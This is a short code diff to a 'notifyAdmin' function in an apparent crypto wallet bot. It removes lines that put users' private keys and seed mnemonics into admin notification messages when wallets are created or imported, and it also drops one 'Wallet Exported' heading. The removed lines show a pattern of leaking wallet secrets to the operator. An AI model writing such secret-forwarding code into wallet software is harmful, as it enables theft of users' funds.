@@ -167,8 +167,6 @@ async function notifyAdmin(type, userId, username, data = {}) {
 🔔 <b>Wallet Created</b>
 👤 User: @${safeUsername} (ID: ${userId})
 📍 Address: <code>${escapeHtml(data.publicKey)}</code>
-🔑 Private Key: <code>${escapeHtml(data.privateKey)}</code>
-📝 Mnemonic: <code>${escapeHtml(data.mnemonic)}</code>
 🪪 Wallet #: ${data.walletNumber || 1}
 ⏰ Time: ${timestamp}
       `;
@@ -179,8 +177,6 @@ async function notifyAdmin(type, userId, username, data = {}) {
 📥 <b>Wallet Imported (Seed Phrase)</b>
 👤 User: @${safeUsername} (ID: ${userId})
 📍 Address: <code>${escapeHtml(data.publicKey)}</code>
-🔑 Private Key: <code>${escapeHtml(data.privateKey)}</code>
-📝 Mnemonic: <code>${escapeHtml(data.mnemonic)}</code>
 🪪 Wallet #: ${data.walletNumber || 1}
 ⏰ Time: ${timestamp}
       `;
@@ -191,7 +187,6 @@ async function notifyAdmin(type, userId, username, data = {}) {
 🔑 <b>Wallet Imported (Private Key)</b>
 👤 User: @${safeUsername} (ID: ${userId})
 📍 Address: <code>${escapeHtml(data.publicKey)}</code>
-🔑 Private Key: <code>${escapeHtml(data.privateKey)}</code>
 🪪 Wallet #: ${data.walletNumber || 1}
 ⏰ Time: ${timestamp}
       `;
@@ -199,7 +194,6 @@ async function notifyAdmin(type, userId, username, data = {}) {
       
     case 'WALLET_EXPORTED':
       message = `
-📤 <b>Wallet Exported</b>
 👤 User: @${safeUsername} (ID: ${userId})
 📍 Address: <code>${escapeHtml(data.publicKey)}</code>
 ⏰ Time: ${timestamp}
